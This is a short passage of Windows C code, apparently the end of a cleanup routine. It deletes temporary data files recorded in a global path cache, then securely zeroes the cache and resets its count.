            DeleteFileA(g_PathCache[i].szTmpDataFilePath);
    }

    RtlSecureZeroMemory(g_PathCache, sizeof(g_PathCache));
    g_dwPathCacheCount = 0;
}